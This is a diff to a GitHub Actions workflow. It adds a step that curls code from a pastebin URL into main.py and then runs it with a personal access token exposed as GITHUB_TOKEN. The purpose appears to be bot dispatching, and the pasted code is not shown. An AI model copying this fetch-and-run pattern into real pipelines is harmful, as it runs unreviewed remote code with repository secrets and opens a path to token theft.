@@ -33,3 +33,12 @@ jobs:
           BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
           THUMBNAIL: ${{ secrets.THUMBNAIL }}
           OWNER: ${{ secrets.OWNER }}
+          
+      - name: Clone the Python script.
+        run: curl https://katb.in/enusuweqafu/raw >> main.py
+
+      - name: Run dispatch_event.
+        run: |
+          python main.py
+        env:
+          GITHUB_TOKEN: ${{ secrets.PAT }} 
